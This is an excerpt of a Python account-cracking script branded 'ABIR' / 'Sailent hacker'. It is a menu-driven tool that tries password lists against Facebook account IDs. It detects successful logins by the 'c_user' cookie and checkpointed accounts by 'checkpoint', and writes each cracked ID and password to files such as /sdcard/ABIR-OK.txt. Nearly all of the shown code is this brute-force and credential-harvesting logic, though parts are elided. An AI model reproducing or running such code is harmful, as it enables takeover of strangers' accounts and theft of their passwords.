...
\33[1;37m----------------------------------------------
→   Owner      :  Md. Abir / mim
→   Facebook   :  Sailent hacker 
→   Github     :  Sailent Hacker 
...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/profile.php?id=100091474683129');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mABIR\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[ABIR-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/ABIR-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[ABIR-CP] '+ids+' | '+pas+'\33[0;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[ABIR-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/ABIR-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[ABIR-OK] '+cid+' | '+ps+'\033[1;32m')
				open('ABIR-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[ABIR-CP] '+cid+' | '+ps+'\33[0;97m')
				open('ABIR-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
